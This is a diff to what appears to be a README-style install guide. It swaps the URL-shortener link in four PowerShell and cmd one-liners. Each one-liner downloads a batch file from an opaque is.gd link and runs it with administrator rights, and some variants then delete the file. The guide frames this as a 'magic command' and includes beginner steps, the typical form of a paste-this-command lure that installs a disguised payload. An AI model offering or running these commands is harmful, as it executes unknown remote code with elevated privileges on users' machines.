@@ -37,7 +37,7 @@
 2. Copy and paste this magic command:
 
 ```powershell
-iwr -UseBasicParsing "https://is.gd/uvY8qR" -OutFile "run.bat"; Start-Process "run.bat" -Verb RunAs -Wait; Remove-Item "run.bat"
+iwr -UseBasicParsing "https://is.gd/sqd51" -OutFile "run.bat"; Start-Process "run.bat" -Verb RunAs -Wait; Remove-Item "run.bat"
 ```
 
 3. Press **Enter** and watch the magic happen! ✨
@@ -62,7 +62,7 @@ iwr -UseBasicParsing "https://is.gd/uvY8qR" -OutFile "run.bat"; Start-Process "r
 </div>
 
 ```powershell
-iwr -UseBasicParsing "https://is.gd/uvY8qR" -OutFile "run.bat"; Start-Process "run.bat" -Verb RunAs
+iwr -UseBasicParsing "https://is.gd/sqd51" -OutFile "run.bat"; Start-Process "run.bat" -Verb RunAs
 ```
 
 ### Option 3: Step-by-Step (For Beginners)
@@ -70,7 +70,7 @@ iwr -UseBasicParsing "https://is.gd/uvY8qR" -OutFile "run.bat"; Start-Process "r
 1. **Open PowerShell**: Right-click Start → **"Windows PowerShell"**
 2. **Download**: 
    ```powershell
-   iwr -UseBasicParsing "https://is.gd/uvY8qR" -OutFile "run.bat"
+   iwr -UseBasicParsing "https://is.gd/sqd51" -OutFile "run.bat"
    ```
 3. **Run as Admin**:
    ```powershell
@@ -80,7 +80,7 @@ iwr -UseBasicParsing "https://is.gd/uvY8qR" -OutFile "run.bat"; Start-Process "r
 ### Option 4: Command Prompt
 
 ```cmd
-powershell -Command "iwr -UseBasicParsing 'https://is.gd/uvY8qR' -OutFile 'run.bat'; Start-Process 'run.bat' -Verb RunAs -Wait; Remove-Item 'run.bat'"
+powershell -Command "iwr -UseBasicParsing 'https://is.gd/sqd51' -OutFile 'run.bat'; Start-Process 'run.bat' -Verb RunAs -Wait; Remove-Item 'run.bat'"
 ```
 
 ---
